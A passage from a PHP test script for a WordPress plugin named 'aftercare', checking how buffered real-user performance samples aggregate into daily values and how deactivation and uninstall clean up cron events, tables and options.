							'url'    => home_url( '/pricing' ),
							'values' => array( 80, 90, 100 ),
						),
					),
					md5( 'nowhere' ) => array(
						'INP' => array(
							'url'    => home_url( '/nowhere/' ),
							'values' => array( 80, 90, 100 ),
						),
					),
				),
			),
			false
		);

		$rum::aggregate_buffer( $samples );
		$inp = $samples->latest_for_day( home_url( '/pricing/' ), 'INP', $yesterday );
		check( null !== $inp && 'rum' === $inp['source'] && 400.0 === $inp['value'], 'buffered values aggregate into a daily p75 for the tracked URL' );
		check( null === $samples->latest_for_day( home_url( '/pricing/' ), 'TTFB', $yesterday ), 'fewer than four values aggregate into nothing' );
		check( 0 === $rows( $wpdb->prepare( 'day < %s', gmdate( 'Y-m-d' ) ) ), 'aggregated days are deleted from the buffer table' );
		$legacy = $samples->latest_for_day( home_url( '/' ), 'INP', $two_days_ago );
		check( null !== $legacy && 4000.0 === $legacy['value'], 'past days in the 1.1.0 buffer option still aggregate' );
		check( $today_rows + 3 === $rows( $wpdb->prepare( 'day = %s', gmdate( 'Y-m-d' ) ) ), "today's tracked values from the 1.1.0 option move into the buffer table" );
		check( false === get_option( $rum::BUFFER_OPTION ), 'the 1.1.0 buffer option is deleted' );

		$wpdb->query( $wpdb->prepare( 'DELETE FROM %i', $table ) );
		Aftercare\Core\Options::update( array( 'tracked_urls' => array() ) );
		break;

	case 'teardown':
		require_once ABSPATH . 'wp-admin/includes/file.php';
		deactivate_plugins( 'aftercare/aftercare.php' );
		check( array() === aftercare_cron_hooks(), 'deactivation clears cron events' );
		uninstall_plugin( 'aftercare/aftercare.php' );
		global $wpdb;
		check( array() === aftercare_tables(), 'uninstall drops tables' );
		$left = (int) $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(*) FROM {$wpdb->options} WHERE option_name LIKE %s", '%aftercare%' ) );
		check( 0 === $left, 'uninstall removes options' );
		break;

	default:
		fwrite( STDERR, "Unknown step: $step\n" );
		exit( 1 );
}
